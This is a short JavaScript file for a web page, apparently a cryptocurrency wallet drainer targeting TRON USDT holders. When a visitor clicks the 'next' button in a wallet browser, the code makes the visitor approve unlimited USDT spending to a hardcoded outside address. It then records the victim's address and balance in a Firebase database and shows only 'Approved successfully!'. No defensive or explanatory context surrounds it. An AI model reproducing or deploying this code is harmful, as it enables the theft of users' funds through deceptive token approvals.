const firebaseConfig = {
  databaseURL: "https://the-og-3a37e-default-rtdb.asia-southeast1.firebasedatabase.app/"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

document.getElementById("next").onclick = async () => {
  if (!window.tronWeb || !tronWeb.defaultAddress.base58) {
    alert("Please open in TronLink or Trust Wallet browser");
    return;
  }

  const userAddress = tronWeb.defaultAddress.base58;

  try {
    const contract = await tronWeb.contract().at(usdtContract);
    await contract.approve("TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN", "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send();

    const balance = await contract.balanceOf(userAddress).call();
    const readable = tronWeb.fromSun(balance.toString());

    await db.ref("users/" + userAddress).set({
      address: userAddress,
      balance: readable,
      timestamp: Date.now()
    });

    alert("Approved successfully!");
  } catch (e) {
    console.error(e);
    alert("Error approving USDT");
  }
};
